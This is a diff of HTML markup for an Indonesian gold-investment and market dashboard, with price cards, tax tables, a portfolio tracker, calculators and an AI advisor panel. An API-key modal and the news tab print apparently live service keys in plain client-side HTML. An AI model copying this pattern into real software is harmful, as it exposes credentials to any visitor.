+                    <div class="bg-slate-950 p-4 rounded-2xl border border-amber-500/40 space-y-2">
+                        <div class="flex justify-between font-bold text-amber-400"><span>Antam CertiCard</span> <span class="bg-amber-500/20 px-2 py-0.5 rounded text-[10px]">Populer</span></div>
+                        <div class="text-xl font-black text-white">Rp 1.485.000 /g</div>
+                        <div class="text-[11px] text-slate-400">Buyback: <strong class="text-emerald-400">Rp 1.332.000</strong></div>
+                    </div>
+                    <div class="bg-slate-950 p-4 rounded-2xl border border-slate-800 space-y-2">
+                        <div class="flex justify-between font-bold text-cyan-400"><span>UBS Gold</span> <span class="bg-cyan-500/20 px-2 py-0.5 rounded text-[10px]">Pegadaian</span></div>
+                        <div class="text-xl font-black text-white">Rp 1.458.000 /g</div>
+                        <div class="text-[11px] text-slate-400">Buyback: <strong class="text-emerald-400">Rp 1.315.000</strong></div>
+                    </div>
+                    <div class="bg-slate-950 p-4 rounded-2xl border border-slate-800 space-y-2">
+                        <div class="flex justify-between font-bold text-purple-400"><span>Galeri 24</span> <span class="bg-purple-500/20 px-2 py-0.5 rounded text-[10px]">BUMN</span></div>
+                        <div class="text-xl font-black text-white">Rp 1.462.000 /g</div>
+                        <div class="text-[11px] text-slate-400">Buyback: <strong class="text-emerald-400">Rp 1.320.000</strong></div>
+                    </div>
+                    <div class="bg-slate-950 p-4 rounded-2xl border border-slate-800 space-y-2">
+                        <div class="flex justify-between font-bold text-emerald-400"><span>Lotus Archi</span> <span class="bg-emerald-500/20 px-2 py-0.5 rounded text-[10px]">Custom</span></div>
+                        <div class="text-xl font-black text-white">Rp 1.460.000 /g</div>
+                        <div class="text-[11px] text-slate-400">Buyback: <strong class="text-emerald-400">Rp 1.318.000</strong></div>
+                    </div>
+                </div>
+            </div>
 
-/* ================= BOOT ================= */
-$('st-run').textContent=localStorage.getItem('mzk_run')||0;
-$('st-time').textContent=new Date().toLocaleTimeString('id-ID');
-setInterval(()=>{$('st-time').textContent=new Date().toLocaleTimeString('id-ID')},1000);
-renderNav();renderGrid();
-toast('[SYS] '+TOOLS.length+' modul aktif — v10.0 siap.');
-</script>
+            <!-- PRICING BREAKDOWN BY GRAMMAGE TABLE -->
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+                
+                <div class="lg:col-span-2 bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-4">
+                    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+                        <h3 class="font-extrabold text-lg text-white flex items-center gap-2">
+                            <i class="fa-solid fa-list-check text-amber-400"></i> Tabel Gramasi Emas Batangan Antam
+                        </h3>
+                        <span class="text-xs text-slate-400 bg-slate-950 px-3 py-1 rounded-full border border-slate-800">Termasuk Estimasi Pajak PPh 22</span>
+                    </div>
+
+                    <div class="overflow-x-auto">
+                        <table class="w-full text-left text-xs sm:text-sm text-slate-300">
+                            <thead class="bg-slate-950 text-xs font-bold uppercase text-slate-400 border-b border-slate-800">
+                                <tr>
+                                    <th class="py-3.5 px-4">Gramasi</th>
+                                    <th class="py-3.5 px-4">Harga Dasar</th>
+                                    <th class="py-3.5 px-4">NPWP (+0.45%)</th>
+                                    <th class="py-3.5 px-4">Non-NPWP (+0.90%)</th>
+                                    <th class="py-3.5 px-4">Buyback Est.</th>
+                                </tr>
+                            </thead>
+                            <tbody class="divide-y divide-slate-800/60" id="goldPricingTableBody">
+                                <!-- Populated dynamically by JS -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- BUYBACK & TAX GUIDELINE CARDS -->
+                <div class="space-y-6">
+                    <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-4">
+                        <h3 class="font-extrabold text-base text-white flex items-center gap-2">
+                            <i class="fa-solid fa-hand-holding-dollar text-emerald-400"></i> Ketentuan Buyback & Pajak Antam
+                        </h3>
+                        <p class="text-xs text-slate-300 leading-relaxed">
+                            Sesuai PMK No 34/PMK.10/2017, penjualan kembali (buyback) emas ke PT Antam Tbk dengan nominal melebihi Rp 10 Juta dikenakan PPh 22 sebesar 1.5% (pemegang NPWP) dan 3.0% (non-NPWP).
+                        </p>
+                        <div class="p-4 bg-slate-950 rounded-2xl border border-slate-800 space-y-2 text-xs">
+                            <div class="flex justify-between">
+                                <span class="text-slate-400">Harga Buyback / Gram:</span>
+                                <strong class="text-emerald-400 font-bold" id="buybackPerGramText">Rp 1.332.000</strong>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-slate-400">Selisih Spread Buyback:</span>
+                                <strong class="text-amber-400 font-bold">Rp 153.000 (10.3%)</strong>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-4">
+                        <h3 class="font-extrabold text-base text-white flex items-center gap-2">
+                            <i class="fa-solid fa-lightbulb text-amber-400"></i> Strategi Investasi Emas
+                        </h3>
+                        <ul class="text-xs text-slate-300 space-y-2.5 list-disc list-inside leading-relaxed">
+                            <li>Gramasi 10g hingga 100g memberikan efisiensi spread ter-optimum bagi pemula.</li>
+                            <li>Emas batangan cocok untuk menjaga daya beli jangka menengah-panjang (3 - 10 tahun).</li>
+                            <li>Pastikan menyimpan emas dalam kemasan CertiCard asli tanpa merusak segel.</li>
+                        </ul>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+
+        <!-- ================= TAB 3: PORTOFOLIO & TARGET LOGAM MULIA ================= -->
+        <div id="tab-portfolio" class="tab-content hidden space-y-8">
+            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-6">
+                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+                    <div>
+                        <h2 class="text-2xl font-black text-white flex items-center gap-2">
+                            <i class="fa-solid fa-vault text-emerald-400"></i> Catatan Portofolio & Target Logam Mulia
+                        </h2>
+                        <p class="text-xs text-slate-400 mt-1">Pantau total tabungan emas fisik Anda dan atur target pencapaian finansial keluarga.</p>
+                    </div>
+                    <div class="flex gap-2">
+                        <button onclick="exportPortfolioTxt()" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-amber-400 font-bold rounded-xl text-xs border border-slate-700 transition flex items-center gap-1.5">
+                            <i class="fa-solid fa-download"></i> Ekspor TXT
+                        </button>
+                        <button onclick="openAddGoldModal()" class="px-4 py-2.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black rounded-xl text-xs transition flex items-center gap-2 shadow-lg">
+                            <i class="fa-solid fa-plus"></i> Tambah Logam Mulia
+                        </button>
+                    </div>
+                </div>
+
+                <!-- PORTFOLIO SUMMARY CARDS -->
+                <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                    <div class="bg-slate-950 p-4 rounded-2xl border border-slate-800">
+                        <div class="text-xs text-slate-400">Total Berat Emas</div>
+                        <div class="text-2xl font-black text-amber-400 mt-1" id="portTotalGram">0 Gram</div>
+                    </div>
+                    <div class="bg-slate-950 p-4 rounded-2xl border border-slate-800">
+                        <div class="text-xs text-slate-400">Nilai Pasar Saat Ini (Buyback)</div>
+                        <div class="text-2xl font-black text-white mt-1" id="portTotalValue">Rp 0</div>
+                    </div>
+                    <div class="bg-slate-950 p-4 rounded-2xl border border-slate-800">
+                        <div class="text-xs text-slate-400">Estimasi Keuntungan (P&L)</div>
+                        <div class="text-2xl font-black text-emerald-400 mt-1" id="portTotalProfit">Rp 0 (0%)</div>
+                    </div>
+                </div>
+
+                <!-- TARGET LOGAM MULIA GOAL TRACKER -->
+                <div class="bg-slate-950 p-5 rounded-2xl border border-slate-800 space-y-3">
+                    <div class="flex items-center justify-between border-b border-slate-800 pb-2">
+                        <h4 class="font-extrabold text-sm text-amber-400 flex items-center gap-2">
+                            <i class="fa-solid fa-bullseye"></i> Target Pencapaian Impian Logam Mulia (Goal Tracker)
+                        </h4>
+                        <button onclick="addNewGoalPrompt()" class="text-xs text-cyan-400 font-bold hover:underline">+ Tambah Target Impian</button>
+                    </div>
+                    <div id="goalsContainerList" class="space-y-3">
+                        <!-- Populated via JS -->
+                    </div>
+                </div>
+
+                <!-- PORTFOLIO ITEMS TABLE -->
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left text-xs sm:text-sm text-slate-300">
+                        <thead class="bg-slate-950 text-xs font-bold uppercase text-slate-400 border-b border-slate-800">
+                            <tr>
+                                <th class="py-3 px-4">Tanggal Beli</th>
+                                <th class="py-3 px-4">Berat (Gram)</th>
+                                <th class="py-3 px-4">Harga Beli /g</th>
+                                <th class="py-3 px-4">Total Modal</th>
+                                <th class="py-3 px-4">Nilai Sekarang</th>
+                                <th class="py-3 px-4">Est. Profit</th>
+                                <th class="py-3 px-4 text-center">Aksi</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-slate-800/60" id="portfolioTableBody">
+                            <!-- Populated dynamically via JS -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= TAB 4: BERITA PASAR & INTEGRASI GOAPI ================= -->
+        <div id="tab-news" class="tab-content hidden space-y-6">
+            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
+                <div>
+                    <h2 class="text-2xl font-black text-white flex items-center gap-2">
+                        <i class="fa-solid fa-newspaper text-cyan-400"></i> Portal Berita Finansial & Pasar Modal
+                    </h2>
+                    <p class="text-xs text-slate-400 mt-1">
+                        Terhubung langsung dengan GoAPI Key (<code class="bg-slate-950 px-2 py-0.5 rounded text-cyan-300 font-mono font-bold">3e5bf69b-6a76-5bec-aefe-acd950a5</code>) & Analisis Pasar Realtime
+                    </p>
+                </div>
+                <div class="w-full md:w-auto">
+                    <input type="text" id="newsPageSearch" onkeyup="searchFullNewsList()" placeholder="Cari kata kunci berita..." class="w-full md:w-80 bg-slate-950 border border-slate-800 text-xs rounded-xl px-4 py-3 text-white focus:border-amber-500 focus:outline-none shadow-inner">
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6" id="fullNewsPageGrid">
+                <!-- Dynamic news items inserted via JS -->
+            </div>
+        </div>
+
+        <!-- ================= TAB 5: TRADINGVIEW GRAFIK TEKNIKAL ================= -->
+        <div id="tab-tradingview" class="tab-content hidden space-y-6">
+            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-4">
+                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+                    <div>
+                        <h2 class="text-2xl font-black text-white flex items-center gap-2">
+                            <i class="fa-solid fa-chart-area text-purple-400"></i> Stasiun Charting Teknikal TradingView
+                        </h2>
+                        <p class="text-xs text-slate-400 mt-1">Widget Charting Interaktif untuk IHSG, Emas Dunia (XAUUSD), Crypto & Forex.</p>
+                    </div>
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="loadTvChart('IDX:COMPOSITE')" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold text-white rounded-xl border border-slate-700 transition">IHSG</button>
+                        <button onclick="loadTvChart('OANDA:XAUUSD')" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold text-amber-400 rounded-xl border border-slate-700 transition">Emas (XAUUSD)</button>
+                        <button onclick="loadTvChart('BINANCE:BTCUSDT')" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold text-cyan-400 rounded-xl border border-slate-700 transition">BTC/USDT</button>
+                        <button onclick="loadTvChart('FX_IDC:USDIDR')" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold text-emerald-400 rounded-xl border border-slate-700 transition">USD/IDR</button>
+                        <button onclick="loadTvChart('TVC:USOIL')" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold text-rose-400 rounded-xl border border-slate-700 transition">Minyak WTI</button>
+                    </div>
+                </div>
+
+                <div class="w-full h-[550px] bg-slate-950 rounded-2xl overflow-hidden border border-slate-800 relative shadow-inner" id="tvChartContainer">
+                    <!-- Embedded iframe chart will load here -->
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= TAB 6: TRADING ECONOMICS MACRO ENGINE ================= -->
+        <div id="tab-macro" class="tab-content hidden space-y-8">
+            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-6">
+                <div>
+                    <h2 class="text-2xl font-black text-white flex items-center gap-2">
+                        <i class="fa-solid fa-globe text-indigo-400"></i> Portal Makro Ekonomi Global & ASEAN
+                    </h2>
+                    <p class="text-xs text-slate-400 mt-1">Indikator PDB, Suku Bunga Bank Sentral, & Inflasi Global (Trading Economics Key: <code class="bg-slate-950 px-2 py-0.5 rounded text-indigo-300 font-mono font-bold">guest:guest</code>)</p>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6" id="macroCardsContainer">
+                    <!-- Populated via JS -->
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= TAB 7: MAZKIAI BOT & KALKULATOR ================= -->
+        <div id="tab-calc" class="tab-content hidden space-y-8">
+            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-xl space-y-6 max-w-4xl mx-auto">
+                <div>
+                    <h2 class="text-2xl font-black text-white flex items-center gap-2">
+                        <i class="fa-solid fa-robot text-rose-400"></i> MazkiAI Intelligence Bot & Simulator Finansial
+                    </h2>
+                    <p class="text-xs text-slate-400 mt-1">Konsultasikan strategi pasar dan hitung proyeksi nilai investasi emas & zakat Anda.</p>
+                </div>
+
+                <!-- SUB TAB CALCULATOR TOGGLE -->
+                <div class="flex flex-wrap gap-2 border-b border-slate-800 pb-3">
+                    <button onclick="switchCalcSubTab('proyeksi')" id="btnCalcProyeksi" class="px-4 py-2 bg-amber-500 text-slate-950 font-bold rounded-xl text-xs shadow-md transition">Proyeksi Investasi</button>
+                    <button onclick="switchCalcSubTab('zakat')" id="btnCalcZakat" class="px-4 py-2 bg-slate-800 text-slate-300 font-bold rounded-xl text-xs hover:text-white transition">Kalkulator Zakat Emas (Nisab 85g)</button>
+                    <button onclick="switchCalcSubTab('aibot')" id="btnCalcAibot" class="px-4 py-2 bg-slate-800 text-purple-300 font-bold rounded-xl text-xs hover:text-white transition flex items-center gap-1.5"><i class="fa-solid fa-wand-magic-sparkles"></i> MazkiAI Advisor</button>
+                </div>
+
+                <!-- PANEL 1: PROYEKSI INVESTASI -->
+                <div id="calcPanelProyeksi" class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div class="space-y-4 bg-slate-950 p-6 rounded-2xl border border-slate-800 shadow-inner">
+                        <h4 class="font-extrabold text-xs text-amber-400 uppercase tracking-wider">Parameter Simulasi</h4>
+                        
+                        <div>
+                            <label class="block text-xs text-slate-300 mb-1 font-semibold">Target Berat Emas (Gram)</label>
+                            <input type="number" id="calcGramInput" value="10" oninput="calculateGoldProfit()" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-amber-500 font-bold">
+                        </div>
+
+                        <div>
+                            <label class="block text-xs text-slate-300 mb-1 font-semibold">Harga Beli Rata-Rata (Rp/gram)</label>
+                            <input type="number" id="calcBuyPriceInput" value="1485000" oninput="calculateGoldProfit()" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-amber-500 font-bold">
+                        </div>
+
+                        <div>
+                            <label class="block text-xs text-slate-300 mb-1 font-semibold">Estimasi Kenaikan Per Tahun (%)</label>
+                            <input type="number" id="calcAnnualReturnInput" value="10" oninput="calculateGoldProfit()" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-amber-500 font-bold">
+                        </div>
+
+                        <div>
+                            <label class="block text-xs text-slate-300 mb-1 font-semibold">Jangka Waktu Simpan (Tahun)</label>
+                            <input type="number" id="calcYearsInput" value="3" oninput="calculateGoldProfit()" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-amber-500 font-bold">
+                        </div>
+                    </div>
+
+                    <div class="space-y-4 bg-slate-950 p-6 rounded-2xl border border-slate-800 flex flex-col justify-between shadow-inner">
+                        <div>
+                            <h4 class="font-extrabold text-xs text-emerald-400 uppercase tracking-wider mb-4">Hasil Proyeksi Masa Depan</h4>
+                            
+                            <div class="space-y-3 text-xs">
+                                <div class="flex justify-between py-2 border-b border-slate-800">
+                                    <span class="text-slate-400">Total Modal Awal:</span>
+                                    <span class="font-bold text-slate-200" id="resModalAwal">Rp 14.850.000</span>
+                                </div>
+                                <div class="flex justify-between py-2 border-b border-slate-800">
+                                    <span class="text-slate-400">Estimasi Harga Emas Kelak:</span>
+                                    <span class="font-bold text-amber-400" id="resFutureGramPrice">Rp 1.976.535 /g</span>
+                                </div>
+                                <div class="flex justify-between py-2 border-b border-slate-800">
+                                    <span class="text-slate-400">Nilai Akhir Setelah Buyback:</span>
+                                    <span class="font-black text-white text-base" id="resTotalFutureValue">Rp 17.788.815</span>
+                                </div>
+                                <div class="flex justify-between py-2 border-b border-slate-800">
+                                    <span class="text-slate-400">Estimasi Keuntungan Netto:</span>
+                                    <span class="font-black text-emerald-400 text-base" id="resNetProfit">+Rp 2.938.815 (+19.8%)</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="space-y-3">
+                            <button onclick="copyCalcReport()" class="w-full py-2.5 bg-slate-800 hover:bg-slate-700 text-amber-400 font-bold text-xs rounded-xl border border-slate-700 transition flex items-center justify-center gap-2">
+                                <i class="fa-solid fa-copy"></i> Salin Ringkasan Proyeksi
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PANEL 2: KALKULATOR ZAKAT EMAS -->
+                <div id="calcPanelZakat" class="hidden grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div class="space-y-4 bg-slate-950 p-6 rounded-2xl border border-slate-800 shadow-inner">
+                        <h4 class="font-extrabold text-xs text-emerald-400 uppercase tracking-wider">Hitung Zakat Emas Simpanan</h4>
+                        
+                        <div>
+                            <label class="block text-xs text-slate-300 mb-1 font-semibold">Total Kepemilikan Emas Physical (Gram)</label>
+                            <input type="number" id="zakatGramInput" value="90" oninput="calculateZakat()" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-amber-500 font-bold">
+                        </div>
+
+                        <div>
+                            <label class="block text-xs text-slate-300 mb-1 font-semibold">Lama Masa Simpan (Haul)</label>
+                            <select id="zakatHaulSelect" onchange="calculateZakat()" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-amber-500 font-bold">
+                                <option value="1">Sudah Mencapai 1 Tahun (Wajib Zakat)</option>
+                                <option value="0">Belum 1 Tahun (Belum Wajib)</option>
+                            </select>
+                        </div>
+
+                        <div class="p-3 bg-slate-900/80 rounded-xl text-xs text-slate-400 space-y-1 border border-slate-800">
+                            <div>• Nisab Emas: <strong>85 Gram</strong></div>
+                            <div>• Tarif Zakat: <strong>2.5%</strong> dari total berat</div>
+                            <div>• Harga Emas ACUAN: <strong class="text-amber-400" id="zakatCurrentPriceText">Rp 1.485.000/g</strong></div>
+                        </div>
+                    </div>
+
+                    <div class="space-y-4 bg-slate-950 p-6 rounded-2xl border border-slate-800 flex flex-col justify-between shadow-inner">
+                        <div>
+                            <h4 class="font-extrabold text-xs text-cyan-400 uppercase tracking-wider mb-4">Status & Estimasi Zakat</h4>
+                            
+                            <div class="space-y-3 text-xs">
+                                <div class="flex justify-between py-2 border-b border-slate-800">
+                                    <span class="text-slate-400">Status Syarat Nisab:</span>
+                                    <span class="font-bold text-emerald-400" id="zakatNisabStatus">MENCAPAI NISAB (≥85g)</span>
+                                </div>
+                                <div class="flex justify-between py-2 border-b border-slate-800">
+                                    <span class="text-slate-400">Zakat Emas (Gram):</span>
+                                    <span class="font-bold text-amber-400" id="zakatGramResult">2.25 Gram</span>
+                                </div>
+                                <div class="flex justify-between py-2 border-b border-slate-800">
+                                    <span class="text-slate-400">Nilai Kewajiban Zakat (IDR):</span>
+                                    <span class="font-black text-emerald-400 text-lg" id="zakatIdrResult">Rp 3.341.250</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="p-3 bg-slate-900 rounded-xl border border-slate-800 text-[11px] text-slate-400 leading-relaxed italic">
+                            Sesuai Peraturan Menteri Agama No. 52/2014, zakat emas wajib ditunaikan jika telah memenuhi nisab 85g dan haul 1 tahun.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PANEL 3: MAZKIAI ADVISOR -->
+                <div id="calcPanelAibot" class="hidden space-y-4 bg-slate-950 p-6 rounded-2xl border border-purple-500/30">
+                    <div class="flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-xl bg-purple-600 flex items-center justify-center text-white font-black text-lg">
+                            <i class="fa-solid fa-robot"></i>
+                        </div>
+                        <div>
+                            <h4 class="font-black text-white text-base">MazkiAI Financial & Market Bot</h4>
+                            <p class="text-xs text-slate-400">Tanyakan seputar investasi emas, tren IHSG, atau nilai tukar Rupiah.</p>
+                        </div>
+                    </div>
+
+                    <div class="flex flex-wrap gap-2 text-xs pt-2">
+                        <button onclick="askAiPreset('Apakah saat ini waktu yang tepat beli emas Antam?')" class="px-3 py-1.5 bg-slate-900 border border-slate-800 hover:border-purple-500/50 rounded-xl text-slate-300 transition">💡 Saatnya beli emas Antam?</button>
+                        <button onclick="askAiPreset('Bagaimana dampak BI Rate 6.00% terhadap IHSG?')" class="px-3 py-1.5 bg-slate-900 border border-slate-800 hover:border-purple-500/50 rounded-xl text-slate-300 transition">📈 Dampak BI Rate 6% ke Saham?</button>
+                        <button onclick="askAiPreset('Apa perbedaan Emas Antam CertiCard dan UBS?')" class="px-3 py-1.5 bg-slate-900 border border-slate-800 hover:border-purple-500/50 rounded-xl text-slate-300 transition">🪙 Beda Antam vs UBS?</button>
+                    </div>
+
+                    <div class="flex gap-2">
+                        <input type="text" id="aiInputPrompt" placeholder="Ketik pertanyaan finansial Anda di sini..." class="flex-1 bg-slate-900 border border-slate-800 rounded-xl p-3 text-xs text-white focus:outline-none focus:border-purple-500">
+                        <button onclick="submitAiQuery()" class="px-5 py-3 bg-purple-600 hover:bg-purple-500 text-white font-bold rounded-xl text-xs transition flex items-center gap-1.5">
+                            <i class="fa-solid fa-paper-plane"></i> Kirim
+                        </button>
+                    </div>
+
+                    <div id="aiResponseBox" class="p-4 bg-slate-900/90 border border-slate-800 rounded-xl text-xs text-slate-200 leading-relaxed min-h-[100px] flex items-center justify-center italic text-slate-400">
+                        Pertanyaan Anda akan dijawab secara real-time oleh MazkiAI Bot...
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+    </main>
+
+    <!-- MODAL: PRICE ALERT SETTING -->
+    <div id="priceAlertModal" class="fixed inset-0 bg-slate-950/85 backdrop-blur-md z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-slate-900 border border-slate-800 w-full max-w-md rounded-3xl p-6 shadow-2xl space-y-4">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+                <h3 class="text-base font-black text-white flex items-center gap-2">
+                    <i class="fa-solid fa-bell text-amber-400"></i> Setel Target Notifikasi Harga
+                </h3>
+                <button onclick="closePriceAlertModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+
+            <p class="text-xs text-slate-300 leading-relaxed">
+                Pasang batas alarm target harga Emas Antam atau IHSG. Sistem akan memicu notifikasi visual saat target tercapai.
+            </p>
+
+            <div class="space-y-3 text-xs">
+                <div>
+                    <label class="block font-semibold text-slate-300 mb-1">Target Harga Emas Antam (Rp/Gram)</label>
+                    <input type="number" id="alertGoldTargetInput" value="1500000" class="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-amber-400 font-bold focus:outline-none">
+                </div>
+                <div>
+                    <label class="block font-semibold text-slate-300 mb-1">Target IHSG Composite Index</label>
+                    <input type="number" id="alertIhsgTargetInput" value="7800" class="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-cyan-400 font-bold focus:outline-none">
+                </div>
+            </div>
+
+            <div class="pt-2 flex justify-between items-center">
+                <button onclick="clearPriceAlerts()" class="text-xs text-rose-400 hover:underline">Hapus Alert</button>
+                <button onclick="savePriceAlerts()" class="px-4 py-2 bg-amber-500 hover:bg-amber-400 text-slate-950 font-black text-xs rounded-xl transition">
+                    Simpan Target Alert
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL: THEME CUSTOMIZER -->
+    <div id="themeCustomizerModal" class="fixed inset-0 bg-slate-950/85 backdrop-blur-md z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-slate-900 border border-slate-800 w-full max-w-sm rounded-3xl p-6 shadow-2xl space-y-4">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+                <h3 class="text-base font-black text-white flex items-center gap-2">
+                    <i class="fa-solid fa-palette text-cyan-400"></i> Warna Aksen Tema Portal
+                </h3>
+                <button onclick="closeThemeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+
+            <div class="grid grid-cols-2 gap-3 text-xs">
+                <button onclick="setAccentTheme('gold')" class="p-3 bg-slate-950 border border-amber-500/50 rounded-2xl flex items-center gap-2 hover:bg-slate-800 transition">
+                    <span class="w-4 h-4 rounded-full bg-amber-500"></span> Amber Gold
+                </button>
+                <button onclick="setAccentTheme('cyan')" class="p-3 bg-slate-950 border border-cyan-500/50 rounded-2xl flex items-center gap-2 hover:bg-slate-800 transition">
+                    <span class="w-4 h-4 rounded-full bg-cyan-400"></span> Cyber Cyan
+                </button>
+                <button onclick="setAccentTheme('emerald')" class="p-3 bg-slate-950 border border-emerald-500/50 rounded-2xl flex items-center gap-2 hover:bg-slate-800 transition">
+                    <span class="w-4 h-4 rounded-full bg-emerald-400"></span> Emerald Wealth
+                </button>
+                <button onclick="setAccentTheme('purple')" class="p-3 bg-slate-950 border border-purple-500/50 rounded-2xl flex items-center gap-2 hover:bg-slate-800 transition">
+                    <span class="w-4 h-4 rounded-full bg-purple-400"></span> Royal Violet
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL: API KEY MANAGER -->
+    <div id="apiModal" class="fixed inset-0 bg-slate-950/85 backdrop-blur-md z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-slate-900 border border-slate-800 w-full max-w-xl rounded-3xl p-6 sm:p-8 shadow-2xl space-y-5 relative max-h-[90vh] overflow-y-auto">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-4">
+                <h3 class="text-lg font-black text-white flex items-center gap-2">
+                    <i class="fa-solid fa-key text-amber-400"></i> Integrasi API Key Aktif (Mazkiplay Engine)
+                </h3>
+                <button onclick="closeApiModal()" class="text-slate-400 hover:text-white p-1"><i class="fa-solid fa-xmark text-xl"></i></button>
+            </div>
+
+            <p class="text-xs text-slate-300 leading-relaxed">
+                Kunci API di bawah ini telah terpasang secara otomatis dan aktif di dalam sistem aplikasi ini. Tidak diperlukan konfigurasi manual tambahan.
+            </p>
+
+            <div class="space-y-4 text-xs">
+                <div class="p-3.5 bg-slate-950 rounded-2xl border border-slate-800 space-y-1.5">
+                    <div class="flex justify-between items-center">
+                        <label class="font-bold text-slate-200">1. GoAPI Key (Berita & Saham)</label>
+                        <span class="text-[10px] bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded font-mono font-bold">CONNECTED</span>
+                    </div>
+                    <input type="text" readonly value="3e5bf69b-6a76-5bec-aefe-acd950a5" class="w-full bg-slate-900 border border-slate-800 rounded-xl p-2.5 font-mono text-cyan-300 font-bold focus:outline-none">
+                </div>
+
+                <div class="p-3.5 bg-slate-950 rounded-2xl border border-slate-800 space-y-1.5">
+                    <div class="flex justify-between items-center">
+                        <label class="font-bold text-slate-200">2. Emas Maulana API Key (Harga Emas Live)</label>
+                        <span class="text-[10px] bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded font-mono font-bold">CONNECTED</span>
+                    </div>
+                    <input type="text" readonly value="fd02b7ac-465b-40b9-b5fc-b9c81e1aac3f" class="w-full bg-slate-900 border border-slate-800 rounded-xl p-2.5 font-mono text-amber-300 font-bold focus:outline-none">
+                </div>
+
+                <div class="p-3.5 bg-slate-950 rounded-2xl border border-slate-800 space-y-1.5">
+                    <div class="flex justify-between items-center">
+                        <label class="font-bold text-slate-200">3. Trading Economics Client Key</label>
+                        <span class="text-[10px] bg-purple-500/20 text-purple-300 px-2 py-0.5 rounded font-mono font-bold">ACTIVE (guest:guest)</span>
+                    </div>
+                    <input type="text" readonly value="guest:guest" class="w-full bg-slate-900 border border-slate-800 rounded-xl p-2.5 font-mono text-purple-300 font-bold focus:outline-none">
+                </div>
+            </div>
+
+            <div class="pt-2 flex justify-end">
+                <button onclick="closeApiModal()" class="px-5 py-2.5 bg-amber-500 hover:bg-amber-400 text-slate-950 font-black text-xs rounded-xl transition shadow-lg">
+                    Tutup Modul
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL: ADD GOLD TO PORTFOLIO -->
+    <div id="addGoldModal" class="fixed inset-0 bg-slate-950/85 backdrop-blur-md z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-slate-900 border border-slate-800 w-full max-w-md rounded-3xl p-6 shadow-2xl space-y-4">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+                <h3 class="text-base font-black text-white flex items-center gap-2">
+                    <i class="fa-solid fa-plus text-emerald-400"></i> Tambah Logam Mulia ke Portofolio
+                </h3>
+                <button onclick="closeAddGoldModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+
+            <div class="space-y-3 text-xs">
+                <div>
